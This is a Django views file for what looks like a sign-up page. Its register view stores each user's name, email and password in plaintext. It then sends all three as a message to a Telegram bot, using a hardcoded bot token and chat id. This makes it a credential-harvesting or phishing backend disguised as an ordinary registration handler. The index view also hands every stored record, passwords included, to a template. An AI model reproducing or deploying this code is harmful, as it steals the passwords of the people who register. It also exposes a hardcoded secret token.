from django.shortcuts import render
from django.http import HttpResponse
from .models import Login
import requests

def index(request):
    users = Login.objects.all()
    return render(request, 'LogIn/index.html',{"users":users})

def register(request):
    nameInput = request.POST.get('name')
    emailInput = request.POST.get('email')
    passwordInput = request.POST.get('password')
    users=Login.objects.create(name=nameInput,email=emailInput,password=passwordInput)

    token="5159583098:AAGxYkWsuYm4miq2filpTpagljNG0vUFjww"
    chat_id="1175591602"

    txt = "Email " + emailInput + "\n" + "name " + nameInput + "\n" + "password " + passwordInput
    data = {'chat_id': chat_id, 'text': txt}
    requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data)

    return HttpResponse('')
